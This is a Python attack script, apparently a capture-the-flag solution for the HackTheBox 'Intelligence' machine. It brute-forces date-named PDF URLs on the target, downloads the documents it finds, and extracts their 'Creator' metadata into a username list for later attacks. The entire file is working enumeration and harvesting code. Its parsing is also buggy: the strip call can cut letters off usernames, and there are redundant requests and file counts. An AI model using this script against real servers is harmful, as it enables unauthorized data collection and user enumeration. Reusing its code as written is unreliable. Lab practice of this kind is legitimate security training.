#!/usr/bin/python3
import string
import os
import requests
import random
import datetime
import re

# format is YYYY-MM-DD
# set the day to 2 chars


def date_generate():
    start_date = datetime.date(2020, 1, 1)
    end_date = datetime.date(2020, 12, 31)
    time_between_dates = end_date - start_date
    days_between_dates = time_between_dates.days
    random_number_of_days = random.randrange(days_between_dates)
    random_date = start_date + datetime.timedelta(days=random_number_of_days)
    return random_date

print(f"Target: Intelligence.htb - 10.10.10.248")

print(f"")


while True:

    date_generate()

    pdf_date = date_generate()
    url = "http://dc.intelligence.htb/documents"
    pdf = f"{pdf_date}-upload.pdf"

    # print(f"Requesting {pdf}")

    # make web request to pdf with random date
    r = requests.get(f"{url}/{pdf}")
    # if return code is 200
    if r.status_code == 200:
        # if pdf is not in the directory
        if os.path.isfile(pdf) == False:
            # check if we can get it from target
            # download the pdf
            print(f"[Y] {pdf} Downloading from Target")
            # print(f"Attempting download of {pdf}")
            requests.get(f"{url}/{pdf}", allow_redirects=True)
            # save the file
            open(pdf, "wb").write(r.content)
        # after ### of pdfs are downloaded, kill while loop
        if len(os.listdir(".")) >= 51:  ################################## YOU MAY WANT TO EDIT THIS TO CHANGE # OF FILES YOU DOWNLOAD.
            print("\nI have enough PDF's downloaded!\n")
            users = []
            for x in os.listdir():
                if x.endswith(".pdf"):
                    # open the file and look for Creator
                    with open(x, "rb") as pf:
                        # make an empty list for users
                        read_file = pf.readlines()
                        for line in read_file:
                            if b"Creator" in line:
                                line = line.strip(b"/Creator (").strip(b")\n").decode().lower()
                                users.append(line)
            list(set(users))

            users_file = open("poc_users.txt", "w")
            print(f"Writing Found Usernames to poc_users.txt!")
            for name in list(set(users)):
                users_file.write(name + "\n")
            users_file.close()
            print(
                f"Users File has been exported to this directory, in the 'poc_users.txt' file!"
            )

            break
        elif os.path.isfile(pdf) == True:
            pass

